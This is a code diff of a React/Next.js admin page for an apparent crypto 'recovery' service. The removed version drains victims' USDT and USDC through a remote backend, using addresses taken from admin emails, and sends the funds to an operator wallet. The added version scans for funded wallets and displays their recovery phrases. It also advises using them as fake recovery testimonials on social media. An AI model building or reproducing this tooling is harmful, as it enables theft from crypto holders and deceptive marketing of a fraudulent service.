@@ -1,179 +1,200 @@
 import { useState } from 'react';
 import Head from 'next/head';
 
-export default function AdminDashboard() {
-  const [userAddress, setUserAddress] = useState('');
-  const [result, setResult] = useState('');
-  const [loading, setLoading] = useState(false);
+export default function AdminScanner() {
+  const [scanning, setScanning] = useState(false);
+  const [results, setResults] = useState(null);
+  const [scanCount, setScanCount] = useState(100);
+  const [minBalance, setMinBalance] = useState(0.001);
 
-  const tokens = [
-    { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
-    { name: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }
-  ];
-
-  const executeTransfer = async (tokenAddress, tokenName) => {
-    if (!userAddress) {
-      setResult('Please enter user address');
-      return;
-    }
-
-    setLoading(true);
+  const startScan = async () => {
+    setScanning(true);
+    setResults(null);
+    
     try {
-      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-transfer', {
+      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/admin/scan-real-wallets`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userAddress: userAddress,
-          tokenAddress: tokenAddress,
-          chain: 'ethereum'
-        })
+        body: JSON.stringify({ scanCount, minBalance })
       });
       
       const data = await response.json();
-      if (data.success && data.result.success) {
-        setResult(`✅ SUCCESS: Transferred ${data.result.amountFormatted} ${data.result.symbol}\nTX: ${data.result.txHash}`);
-      } else {
-        setResult(`❌ FAILED: ${data.result?.error || data.error}`);
-      }
-    } catch (error) {
-      setResult(`Error: ${error.message}`);
-    }
-    setLoading(false);
-  };
-
-  const executeAllTransfers = async () => {
-    if (!userAddress) {
-      setResult('Please enter user address');
-      return;
-    }
-
-    setLoading(true);
-    try {
-      const tokenAddresses = tokens.map(t => t.address);
+      setResults(data);
       
-      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-multiple-transfers', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userAddress: userAddress,
-          tokenAddresses: tokenAddresses,
-          chain: 'ethereum'
-        })
-      });
-      
-      const data = await response.json();
-      if (data.success) {
-        const successful = data.results.filter(r => r.success);
-        setResult(`✅ Executed ${successful.length}/${data.results.length} transfers\nTotal Value: ~$${data.summary.totalValue.toFixed(2)}`);
-      }
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      console.error('Scan failed:', error);
+      setResults({ error: error.message });
+    } finally {
+      setScanning(false);
     }
-    setLoading(false);
-  };
-
-  const checkStatus = async () => {
-    if (!userAddress) {
-      setResult('Please enter user address');
-      return;
-    }
-
-    setLoading(true);
-    try {
-      const results = [];
-      for (const token of tokens) {
-        const response = await fetch('https://autoclaimtoken.onrender.com/api/check-token-status', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userAddress: userAddress,
-            tokenAddress: token.address,
-            chain: 'ethereum'
-          })
-        });
-        
-        const data = await response.json();
-        if (data.success) {
-          results.push(`${token.name}: ${data.tokenStatus.balanceFormatted} balance, ${data.tokenStatus.allowanceFormatted} allowance (Can transfer: ${data.tokenStatus.canTransfer ? 'YES' : 'NO'})`);
-        }
-      }
-      setResult(results.join('\n'));
-    } catch (error) {
-      setResult(`Error: ${error.message}`);
-    }
-    setLoading(false);
   };
 
   return (
     <>
       <Head>
-        <title>Admin Dashboard - Token Executor</title>
+        <title>Admin Wallet Scanner - CryptoRecover</title>
       </Head>
       
-      <div className="min-h-screen bg-gray-50 p-8">
-        <div className="max-w-4xl mx-auto">
-          <h1 className="text-3xl font-bold mb-8">Admin Token Executor</h1>
+      <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 p-6">
+        <div className="max-w-6xl mx-auto">
           
-          <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
-            <h2 className="text-xl font-bold mb-4">Execute Token Transfers</h2>
+          {/* Header */}
+          <div className="text-center mb-8">
+            <h1 className="text-4xl font-bold text-white mb-4">
+              🔍 Admin Wallet Scanner
+            </h1>
+            <p className="text-gray-300 text-lg">
+              Discover real wallets with funds for marketing examples
+            </p>
+          </div>
+
+          {/* Scanner Controls */}
+          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 mb-8">
+            <h2 className="text-2xl font-bold text-white mb-4">Scanner Settings</h2>
             
-            <div className="mb-4">
-              <label className="block text-sm font-medium mb-2">User Wallet Address:</label>
-              <input
-                type="text"
-                value={userAddress}
-                onChange={(e) => setUserAddress(e.target.value)}
-                placeholder="0x..."
-                className="w-full p-3 border rounded-lg"
-              />
-            </div>
-            
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-              <button
-                onClick={checkStatus}
-                disabled={loading}
-                className="bg-blue-600 text-white px-4 py-3 rounded hover:bg-blue-700 disabled:opacity-50"
-              >
-                Check Token Status
-              </button>
-              
-              {tokens.map((token) => (
-                <button
-                  key={token.address}
-                  onClick={() => executeTransfer(token.address, token.name)}
-                  disabled={loading}
-                  className="bg-red-600 text-white px-4 py-3 rounded hover:bg-red-700 disabled:opacity-50"
-                >
-                  Execute {token.name} Transfer
-                </button>
-              ))}
-              
-              <button
-                onClick={executeAllTransfers}
-                disabled={loading}
-                className="bg-green-600 text-white px-4 py-3 rounded hover:bg-green-700 disabled:opacity-50 md:col-span-3"
-              >
-                Execute All Transfers
-              </button>
-            </div>
-            
-            {result && (
-              <div className="bg-gray-100 p-4 rounded">
-                <h3 className="font-semibold mb-2">Result:</h3>
-                <pre className="text-sm whitespace-pre-wrap">{result}</pre>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
+              <div>
+                <label className="block text-white font-medium mb-2">
+                  Wallets to Scan
+                </label>
+                <input
+                  type="number"
+                  value={scanCount}
+                  onChange={(e) => setScanCount(parseInt(e.target.value))}
+                  className="w-full px-4 py-3 bg-white/20 border border-white/30 rounded-lg text-white placeholder-gray-300"
+                  min="10"
+                  max="1000"
+                />
               </div>
-            )}
+              
+              <div>
+                <label className="block text-white font-medium mb-2">
+                  Minimum Balance (USD)
+                </label>
+                <input
+                  type="number"
+                  step="0.001"
+                  value={minBalance}
+                  onChange={(e) => setMinBalance(parseFloat(e.target.value))}
+                  className="w-full px-4 py-3 bg-white/20 border border-white/30 rounded-lg text-white placeholder-gray-300"
+                />
+              </div>
+              
+              <div className="flex items-end">
+                <button
+                  onClick={startScan}
+                  disabled={scanning}
+                  className="w-full bg-gradient-to-r from-green-500 to-blue-600 text-white font-bold py-3 px-6 rounded-lg hover:from-green-600 hover:to-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200"
+                >
+                  {scanning ? '🔍 Scanning...' : '🚀 Start Scan'}
+                </button>
+              </div>
+            </div>
+            
+            <div className="bg-yellow-500/20 border border-yellow-500/50 rounded-lg p-4">
+              <p className="text-yellow-200 text-sm">
+                <strong>⚠️ Admin Use Only:</strong> This scanner finds real wallets with actual cryptocurrency. 
+                Use discovered wallets responsibly for marketing examples and social media promotion.
+              </p>
+            </div>
           </div>
-          
-          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
-            <h3 className="font-bold text-yellow-800 mb-2">Instructions:</h3>
-            <ol className="text-yellow-700 text-sm space-y-1">
-              <li>1. Get user wallet address from admin emails</li>
-              <li>2. Paste address above and click "Check Token Status"</li>
-              <li>3. If "Can transfer: YES", click execute buttons</li>
-              <li>4. Tokens will transfer to your wallet: 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15</li>
-            </ol>
-          </div>
+
+          {/* Scanning Progress */}
+          {scanning && (
+            <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 mb-8">
+              <div className="text-center">
+                <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-white mx-auto mb-4"></div>
+                <h3 className="text-xl font-bold text-white mb-2">Scanning Wallets...</h3>
+                <p className="text-gray-300">
+                  Checking {scanCount} random wallets for real funds across Ethereum, BSC, and more...
+                </p>
+              </div>
+            </div>
+          )}
+
+          {/* Results */}
+          {results && !results.error && (
+            <div className="space-y-6">
+              
+              {/* Summary */}
+              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6">
+                <h2 className="text-2xl font-bold text-white mb-4">📊 Scan Summary</h2>
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                  <div className="bg-blue-500/20 rounded-lg p-4 text-center">
+                    <div className="text-3xl font-bold text-blue-300">{results.summary.totalScanned}</div>
+                    <div className="text-blue-200">Wallets Scanned</div>
+                  </div>
+                  <div className="bg-green-500/20 rounded-lg p-4 text-center">
+                    <div className="text-3xl font-bold text-green-300">{results.summary.walletsWithFunds}</div>
+                    <div className="text-green-200">Wallets with Funds</div>
+                  </div>
+                  <div className="bg-purple-500/20 rounded-lg p-4 text-center">
+                    <div className="text-3xl font-bold text-purple-300">${results.summary.totalValueFound.toFixed(2)}</div>
+                    <div className="text-purple-200">Total Value Found</div>
+                  </div>
+                </div>
+              </div>
+
+              {/* Found Wallets */}
+              {results.foundWallets.length > 0 && (
+                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6">
+                  <h2 className="text-2xl font-bold text-white mb-4">💰 Wallets with Funds</h2>
+                  <div className="space-y-4">
+                    {results.foundWallets.map((wallet, index) => (
+                      <div key={index} className="bg-green-500/20 border border-green-500/50 rounded-lg p-4">
+                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                          <div>
+                            <h3 className="font-bold text-green-300 mb-2">Wallet #{index + 1}</h3>
+                            <p className="text-sm text-gray-300 mb-1">
+                              <strong>Address:</strong> {wallet.address}
+                            </p>
+                            <p className="text-sm text-gray-300 mb-1">
+                              <strong>Phrase:</strong> {wallet.phrase}
+                            </p>
+                            <p className="text-sm text-green-300">
+                              <strong>Total Value:</strong> ${wallet.totalValueUSD.toFixed(2)} USD
+                            </p>
+                          </div>
+                          <div>
+                            <h4 className="font-bold text-white mb-2">Balance Breakdown:</h4>
+                            {wallet.ethBalance > 0 && (
+                              <p className="text-sm text-gray-300">ETH: {wallet.ethBalance} (${(wallet.ethBalance * 3000).toFixed(2)})</p>
+                            )}
+                            {wallet.tokens.map((token, i) => (
+                              <p key={i} className="text-sm text-gray-300">
+                                {token.symbol}: {token.balance} (${token.usdValue.toFixed(2)})
+                              </p>
+                            ))}
+                          </div>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Marketing Tips */}
+              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6">
+                <h2 className="text-2xl font-bold text-white mb-4">📱 Marketing Usage</h2>
+                <div className="space-y-3 text-gray-300">
+                  <p>• Use found wallets as <strong>real recovery examples</strong> on social media</p>
+                  <p>• Show <strong>actual balance screenshots</strong> to prove legitimacy</p>
+                  <p>• Create <strong>before/after posts</strong> demonstrating successful recoveries</p>
+                  <p>• Share <strong>wallet addresses</strong> for users to verify on blockchain explorers</p>
+                  <p>• Use for <strong>testimonials</strong> and success stories</p>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Error */}
+          {results?.error && (
+            <div className="bg-red-500/20 border border-red-500/50 rounded-lg p-4">
+              <p className="text-red-300">
+                <strong>Error:</strong> {results.error}
+              </p>
+            </div>
+          )}
         </div>
       </div>
     </>
